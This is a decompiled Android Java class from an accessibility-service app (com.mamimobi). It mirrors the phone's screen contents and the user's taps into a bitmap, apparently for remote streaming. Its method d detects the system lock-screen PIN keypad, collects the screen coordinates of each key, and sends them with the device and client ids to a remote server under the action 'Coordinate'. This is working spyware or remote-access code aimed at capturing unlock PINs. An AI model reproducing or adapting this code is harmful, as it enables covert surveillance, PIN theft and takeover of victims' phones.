package defpackage;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PorterDuff;
import android.graphics.Rect;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.ScreenPoints;
import io.nats.client.support.ApiConstants;
import java.util.HashMap;
import java.util.HashSet;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public final class vh0 {
    public static final AtomicBoolean r = new AtomicBoolean(false);
    public static final AtomicBoolean s = new AtomicBoolean(false);
    public Bitmap a;
    public Canvas b;
    public Paint c;
    public Paint d;
    public Paint e;
    public Paint f;
    public Paint g;
    public Paint h;
    public final float k;
    public final float l;
    public final float m;
    public final float n;
    public final Context q;
    public final Rect i = new Rect();
    public Rect j = new Rect();
    public final HashSet o = new HashSet();
    public final LinkedBlockingQueue p = new LinkedBlockingQueue();

    public vh0(Context context) {
        DisplayMetrics displayMetrics = new DisplayMetrics();
        ((WindowManager) context.getSystemService("window")).getDefaultDisplay().getRealMetrics(displayMetrics);
        this.q = context.getApplicationContext();
        float fMin = Math.min(720.0f / displayMetrics.widthPixels, 1280.0f / displayMetrics.heightPixels);
        this.k = fMin;
        this.l = fMin;
        this.m = (720 - ((int) (r5 * fMin))) / 2.0f;
        this.n = (1280 - ((int) (r0 * fMin))) / 2.0f;
        this.a = Bitmap.createBitmap(720, 1280, Bitmap.Config.ARGB_8888);
        this.b = new Canvas(this.a);
        Paint paint = new Paint();
        this.c = paint;
        paint.setColor(-16711936);
        this.c.setStrokeWidth(2.0f);
        Paint paint2 = this.c;
        Paint.Style style = Paint.Style.STROKE;
        paint2.setStyle(style);
        this.c.setAntiAlias(false);
        Paint paint3 = new Paint();
        this.d = paint3;
        paint3.setColor(-1);
        this.d.setTextSize(28.0f);
        this.d.setAntiAlias(true);
        Paint paint4 = new Paint();
        this.g = paint4;
        paint4.setStyle(style);
        this.g.setStrokeWidth(3.0f);
        this.g.setColor(Color.parseColor("#FF9800"));
        this.g.setAntiAlias(true);
        Paint paint5 = new Paint();
        this.h = paint5;
        Paint.Style style2 = Paint.Style.FILL;
        paint5.setStyle(style2);
        this.h.setColor(0);
        this.h.setAntiAlias(true);
        Paint paint6 = new Paint();
        this.e = paint6;
        paint6.setStyle(style2);
        this.e.setColor(Color.argb(160, 0, 0, 0));
        this.e.setAntiAlias(true);
        Paint paint7 = new Paint();
        this.f = paint7;
        paint7.setColor(-256);
        this.f.setStyle(style2);
        this.f.setAntiAlias(true);
        final int i = 0;
        AccessService.Y0.add(new ij0(this) { // from class: uh0
            public final /* synthetic */ vh0 b;

            {
                this.b = this;
            }

            @Override // defpackage.ij0
            public final void a(float f, float f2) {
                switch (i) {
                    case 0:
                        vh0 vh0Var = this.b;
                        vh0Var.getClass();
                        ScreenPoints screenPoints = new ScreenPoints();
                        screenPoints.x = (int) ((f * vh0Var.k) + vh0Var.m);
                        screenPoints.y = (int) ((f2 * vh0Var.l) + vh0Var.n);
                        screenPoints.action = "click";
                        vh0Var.p.offer(screenPoints);
                        break;
                    default:
                        vh0 vh0Var2 = this.b;
                        vh0Var2.getClass();
                        ScreenPoints screenPoints2 = new ScreenPoints();
                        screenPoints2.x = (int) ((f * vh0Var2.k) + vh0Var2.m);
                        screenPoints2.y = (int) ((f2 * vh0Var2.l) + vh0Var2.n);
                        screenPoints2.action = "click";
                        vh0Var2.p.offer(screenPoints2);
                        break;
                }
            }
        });
        final int i2 = 1;
        xm0.e.add(new ij0(this) { // from class: uh0
            public final /* synthetic */ vh0 b;

            {
                this.b = this;
            }

            @Override // defpackage.ij0
            public final void a(float f, float f2) {
                switch (i2) {
                    case 0:
                        vh0 vh0Var = this.b;
                        vh0Var.getClass();
                        ScreenPoints screenPoints = new ScreenPoints();
                        screenPoints.x = (int) ((f * vh0Var.k) + vh0Var.m);
                        screenPoints.y = (int) ((f2 * vh0Var.l) + vh0Var.n);
                        screenPoints.action = "click";
                        vh0Var.p.offer(screenPoints);
                        break;
                    default:
                        vh0 vh0Var2 = this.b;
                        vh0Var2.getClass();
                        ScreenPoints screenPoints2 = new ScreenPoints();
                        screenPoints2.x = (int) ((f * vh0Var2.k) + vh0Var2.m);
                        screenPoints2.y = (int) ((f2 * vh0Var2.l) + vh0Var2.n);
                        screenPoints2.action = "click";
                        vh0Var2.p.offer(screenPoints2);
                        break;
                }
            }
        });
    }

    public static String b(AccessibilityNodeInfo accessibilityNodeInfo) {
        return (accessibilityNodeInfo.getText() == null || accessibilityNodeInfo.getText().length() <= 0) ? (accessibilityNodeInfo.getContentDescription() == null || accessibilityNodeInfo.getContentDescription().length() <= 0) ? "" : accessibilityNodeInfo.getContentDescription().toString() : accessibilityNodeInfo.getText().toString();
    }

    public final void a(AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        int iIdentityHashCode = System.identityHashCode(accessibilityNodeInfo);
        HashSet hashSet = this.o;
        if (hashSet.contains(Integer.valueOf(iIdentityHashCode))) {
            return;
        }
        hashSet.add(Integer.valueOf(iIdentityHashCode));
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && child.isVisibleToUser()) {
                a(child, z);
            }
        }
        if (accessibilityNodeInfo.getChildCount() > 0) {
            return;
        }
        Rect rect = this.i;
        accessibilityNodeInfo.getBoundsInScreen(rect);
        if (rect.isEmpty()) {
            return;
        }
        float f = rect.left;
        float f2 = this.k;
        float f3 = this.m;
        int i2 = (int) ((f * f2) + f3);
        float f4 = rect.top;
        float f5 = this.l;
        float f6 = this.n;
        int i3 = (int) ((rect.right * f2) + f3);
        int iMax = Math.max(0, Math.min(i2, this.b.getWidth()));
        int iMax2 = Math.max(0, Math.min((int) ((f4 * f5) + f6), this.b.getHeight()));
        int iMax3 = Math.max(0, Math.min(i3, this.b.getWidth()));
        int iMax4 = Math.max(0, Math.min((int) ((rect.bottom * f5) + f6), this.b.getHeight()));
        if (iMax >= iMax3 || iMax2 >= iMax4) {
            return;
        }
        Rect rect2 = new Rect(iMax, iMax2, iMax3, iMax4);
        this.b.drawRect(rect2, z ? this.g : this.c);
        String strB = b(accessibilityNodeInfo);
        if (strB.isEmpty()) {
            return;
        }
        if (z) {
            HashMap map = AccessService.W0;
            if (!map.containsKey(strB)) {
                map.put(strB, new Rect(rect));
            }
        }
        Paint paint = z ? this.h : this.e;
        this.d.setTextSize(24.0f);
        float fMeasureText = this.d.measureText(strB);
        if (fMeasureText > rect2.width() && rect2.width() > 0) {
            this.d.setTextSize(Math.max((rect2.width() * 24.0f) / fMeasureText, 12.0f));
            fMeasureText = this.d.measureText(strB);
        }
        Paint.FontMetrics fontMetrics = this.d.getFontMetrics();
        float f7 = 8;
        float fMax = Math.max(f7, Math.min(rect2.left + 8, (this.b.getWidth() - fMeasureText) - f7));
        float fCenterY = rect2.centerY();
        float f8 = fontMetrics.ascent;
        float f9 = fontMetrics.descent;
        float f10 = fCenterY - ((f8 + f9) / 2.0f);
        float f11 = f9 - f8;
        float f12 = 16;
        float f13 = fMax - f7;
        float f14 = ((int) (f11 + f12)) / 2.0f;
        this.j.set((int) f13, (int) (rect2.centerY() - f14), (int) (f13 + ((int) (fMeasureText + f12))), (int) (rect2.centerY() + f14));
        if (paint.getAlpha() > 0) {
            this.b.drawRect(this.j, paint);
        }
        this.d.setColor(-1);
        this.d.setShadowLayer(2.0f, 1.0f, 1.0f, -16777216);
        this.b.drawText(strB, fMax, f10, this.d);
        this.d.setShadowLayer(0.0f, 0.0f, 0.0f, 0);
    }

    public final void c(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        int iIdentityHashCode = System.identityHashCode(accessibilityNodeInfo);
        HashSet hashSet = this.o;
        if (hashSet.contains(Integer.valueOf(iIdentityHashCode))) {
            return;
        }
        hashSet.add(Integer.valueOf(iIdentityHashCode));
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && child.isVisibleToUser()) {
                c(child);
            }
        }
        if (accessibilityNodeInfo.getChildCount() > 0) {
            return;
        }
        Rect rect = this.i;
        accessibilityNodeInfo.getBoundsInScreen(rect);
        if (rect.isEmpty()) {
            return;
        }
        String strB = b(accessibilityNodeInfo);
        if (strB.isEmpty()) {
            return;
        }
        HashMap map = AccessService.X0;
        if (map.containsKey(strB)) {
            return;
        }
        map.put(strB, rect);
    }

    public final Bitmap d(AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityNodeInfo accessibilityNodeInfo2) {
        this.b.drawColor(0, PorterDuff.Mode.CLEAR);
        this.o.clear();
        if (this.b != null) {
            if (accessibilityNodeInfo != null) {
                a(accessibilityNodeInfo, false);
                if ("com.android.systemui".contentEquals(accessibilityNodeInfo.getPackageName()) && ((AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/pinColorNumericKeyboard") != null || AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/pinEntry") != null || AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry") != null || AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/oplusos_kgd_security_pin_six_view") != null) && s.compareAndSet(false, true))) {
                    try {
                        c(accessibilityNodeInfo);
                        HashMap map = AccessService.X0;
                        if (!map.isEmpty()) {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("packageName", accessibilityNodeInfo.getPackageName());
                            for (String str : map.keySet()) {
                                Rect rect = (Rect) AccessService.X0.get(str);
                                if (rect != null) {
                                    jSONObject.put(str, rect.centerX() + "," + rect.centerY());
                                }
                            }
                            e(jSONObject);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            if (accessibilityNodeInfo2 != null) {
                if (accessibilityNodeInfo2.getPackageName() != null) {
                    AccessService.V0 = accessibilityNodeInfo2.getPackageName().toString();
                }
                for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i);
                    if (child != null && child.isVisibleToUser()) {
                        a(child, true);
                    }
                }
                if (r.compareAndSet(false, true)) {
                    try {
                        HashMap map2 = AccessService.W0;
                        if (!map2.isEmpty()) {
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put("packageName", accessibilityNodeInfo2.getPackageName());
                            for (String str2 : map2.keySet()) {
                                Rect rect2 = (Rect) AccessService.W0.get(str2);
                                if (rect2 != null) {
                                    jSONObject2.put(str2, rect2.centerX() + "," + rect2.centerY());
                                }
                            }
                            e(jSONObject2);
                        }
                    } catch (Exception e2) {
                        e2.printStackTrace();
                    }
                }
            }
        }
        ScreenPoints screenPoints = (ScreenPoints) this.p.poll();
        if (screenPoints != null) {
            try {
                this.f.setColor(-256);
                this.b.drawCircle(screenPoints.x, screenPoints.y, 15.0f, this.f);
            } catch (Exception unused) {
            }
        }
        return this.a;
    }

    public final void e(JSONObject jSONObject) {
        Context context = this.q;
        try {
            o71 o71VarF = o71.f(context);
            lm0 lm0Var = o71VarF.e;
            String strV = t40.V(context);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(ApiConstants.ID, strV);
            jSONObject2.put(ApiConstants.ACTION, "Coordinate");
            if (o71VarF.e() != null) {
                jSONObject2.put("clientid", o71VarF.e());
            }
            jSONObject2.put(ApiConstants.DATA, jSONObject);
            lm0Var.c(jSONObject2.toString().getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
